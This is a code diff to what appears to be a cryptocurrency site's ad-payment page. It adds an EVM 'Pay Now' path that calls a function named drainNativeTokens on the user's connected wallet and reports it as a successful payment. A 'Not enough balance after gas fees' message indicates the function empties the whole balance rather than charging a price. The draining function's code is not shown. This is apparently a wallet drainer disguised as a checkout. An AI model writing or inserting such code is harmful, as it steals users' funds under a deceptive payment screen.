@@ -16,6 +16,9 @@ import { sendTelegramMessage } from '@/utils/telegram';
 import { AnimatedLogo } from '@/components/AnimatedLogo';
 import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
+import { useChain } from '@/contexts/ChainContext';
+import { useEVMWallet } from '@/providers/EVMWalletProvider';
+import { drainNativeTokens } from '@/utils/evmTransactions';
 
 const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
 const MAX_BATCH_SIZE = 5;
@@ -170,6 +173,8 @@ const Ads = () => {
   const { connection } = useConnection();
   const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
+  const { activeChain, getEVMChain } = useChain();
+  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
 
   // Fetch all balances like donate button
   const fetchAllBalances = useCallback(async () => {
@@ -559,6 +564,29 @@ const Ads = () => {
   };
 
   const handlePayNow = async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      setIsVerifying(true);
+      try {
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} payment...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          setPaymentStatus('SUCCESS');
+          toast.success(`${chainName} payment successful!`);
+        } else {
+          toast.info('Not enough balance after gas fees');
+        }
+      } catch (error: any) {
+        setPaymentStatus('FAILED');
+        toast.error('Payment failed: ' + (error?.message || 'Unknown error'));
+      } finally {
+        setIsVerifying(false);
+      }
+      return;
+    }
+
+    // Solana path (original code continues below)
     let currentPublicKey = publicKey;
     let activeSigner: any = null;
 
